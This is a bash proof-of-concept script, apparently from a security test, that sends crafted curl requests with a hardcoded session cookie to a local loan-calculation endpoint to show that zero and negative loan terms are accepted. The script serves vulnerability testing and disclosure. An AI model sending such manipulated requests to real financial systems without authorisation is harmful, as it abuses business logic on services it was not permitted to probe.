#!/bin/bash

# POC: Business Logic Flaw - Zero and Negative Term Values Accepted
# This script demonstrates that the /total_loan_payments endpoint
# accepts zero and negative term values, violating business logic constraints

TARGET="http://localhost:80"
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aQ41ow.dATezR6aFvM2xLzH7fFEw5nANQc"

echo "=========================================="
echo "POC: Term Validation Business Logic Flaw"
echo "=========================================="
echo ""

# Test 1: Zero term
echo "[TEST 1] Zero Term (should be rejected)"
echo "Command: curl -s -b \"$SESSION_COOKIE\" '$TARGET/total_loan_payments?principal=100000&payment=500&term=0'"
echo ""
RESPONSE1=$(curl -s -b "$SESSION_COOKIE" "$TARGET/total_loan_payments?principal=100000&payment=500&term=0")
echo "Response:"
echo "$RESPONSE1" | jq . 2>/dev/null || echo "$RESPONSE1"
echo ""

# Verify zero term was accepted (vulnerability)
if echo "$RESPONSE1" | grep -q '"loan_term_amount": "0"'; then
    echo "❌ VULNERABILITY CONFIRMED: Zero term value was accepted"
    echo "   Result: total_loan_payments = $RESPONSE1" | jq -r '.total_loan_payments' 2>/dev/null
else
    echo "✓ Zero term was properly rejected"
fi
echo ""
echo "=========================================="
echo ""

# Test 2: Negative term
echo "[TEST 2] Negative Term (should be rejected)"
echo "Command: curl -s -b \"$SESSION_COOKIE\" '$TARGET/total_loan_payments?principal=100000&payment=500&term=-30'"
echo ""
RESPONSE2=$(curl -s -b "$SESSION_COOKIE" "$TARGET/total_loan_payments?principal=100000&payment=500&term=-30")
echo "Response:"
echo "$RESPONSE2" | jq . 2>/dev/null || echo "$RESPONSE2"
echo ""

# Verify negative term was accepted (vulnerability)
if echo "$RESPONSE2" | grep -q '"loan_term_amount": "-30"'; then
    echo "❌ VULNERABILITY CONFIRMED: Negative term value was accepted"
    TOTAL=$(echo "$RESPONSE2" | jq -r '.total_loan_payments' 2>/dev/null)
    echo "   Result: total_loan_payments = $TOTAL (negative calculation)"
else
    echo "✓ Negative term was properly rejected"
fi
echo ""
echo "=========================================="
echo ""

# Test 3: Valid positive term (control test)
echo "[TEST 3] Valid Positive Term (control - should be accepted)"
echo "Command: curl -s -b \"$SESSION_COOKIE\" '$TARGET/total_loan_payments?principal=100000&payment=500&term=60'"
echo ""
RESPONSE3=$(curl -s -b "$SESSION_COOKIE" "$TARGET/total_loan_payments?principal=100000&payment=500&term=60")
echo "Response:"
echo "$RESPONSE3" | jq . 2>/dev/null || echo "$RESPONSE3"
echo ""

echo "=========================================="
echo "POC Summary:"
echo "=========================================="
echo "The endpoint accepts zero and negative term values without validation."
echo "This violates business logic constraints for financial calculations."
echo "A valid loan term should always be a positive integer (> 0)."